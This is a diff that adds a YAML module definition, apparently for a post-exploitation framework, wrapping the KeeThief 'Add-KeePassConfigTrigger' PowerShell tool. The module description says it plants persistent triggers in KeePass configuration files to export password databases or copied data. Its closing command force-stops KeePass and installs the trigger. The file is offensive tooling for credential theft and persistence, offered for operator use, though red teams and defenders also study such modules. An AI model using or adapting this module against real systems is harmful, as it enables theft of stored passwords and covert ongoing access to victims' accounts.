@@ -1,0 +1,72 @@
+name: Add-KeePassConfigTrigger
+authors:
+  - name: Lee Christensen
+    handle: '@tifkin_'
+    link: https://twitter.com/tifkin_
+  - name: Will Schroeder
+    handle: '@harmj0y'
+    link: https://twitter.com/harmj0y
+description: |
+  A PowerShell module that installs persistent exfiltration triggers
+  into KeePass configuration files to enable automatic credential
+  harvesting. This module is part of the KeeThief toolkit designed
+  for long-term access to password manager contents.
+
+  The module first terminates any running KeePass processes to ensure
+  configuration files can be modified, then adds custom triggers that
+  automatically export database contents or copy data when specific
+  conditions are met. These triggers can be configured to export
+  entire databases or capture data that users copy from KeePass,
+  providing persistent access to stored credentials.
+
+  This persistence mechanism is particularly effective because it
+  leverages KeePass's legitimate trigger functionality to perform
+  malicious exfiltration. The triggers can be configured to execute
+  when databases are opened, when data is copied, or based on other
+  user actions, ensuring continuous access to sensitive information
+  without requiring ongoing operator interaction.
+software: ''
+tactics: [TA0003, TA0009]
+techniques: [T1119, T1546]
+background: true
+output_extension: ''
+needs_admin: false
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments:
+  - https://github.com/adaptivethreat/KeeThief
+options:
+  - name: Agent
+    description: Agent to run the module on.
+    required: true
+    value: ''
+  - name: Action
+    description: "'ExportDatabase' (export opened databases to $ExportPath) or 'ExfilDataCopied'
+      (export copied data to $ExportPath)."
+    required: true
+    value: ExportDatabase
+  - name: ExportPath
+    description: The path to export data to, defaults to %APPDATA%\KeePass\
+    required: false
+    value: ''
+  - name: TriggerName
+    description: The name for the trigger.
+    required: true
+    value: Debug
+  - name: OutputFunction
+    description: PowerShell's output function to use ("Out-String", "ConvertTo-Json",
+      "ConvertTo-Csv", "ConvertTo-Html", "ConvertTo-Xml").
+    required: false
+    value: Out-String
+    strict: false
+    suggested_values:
+      - Out-String
+      - ConvertTo-Json
+      - ConvertTo-Csv
+      - ConvertTo-Html
+      - ConvertTo-Xml
+script_path: collection/vaults/KeePassConfig.ps1
+script_end: Get-Process *keepass* | Stop-Process -Force; Find-KeePassconfig | Add-KeePassConfigTrigger
+  {{ PARAMS }}; Find-KeePassconfig | Get-KeePassConfigTrigger | Format-List | {{
+  OUTPUT_FUNCTION }} | %{$_ + "`n"}; 'Add-KeePassConfigTrigger completed'
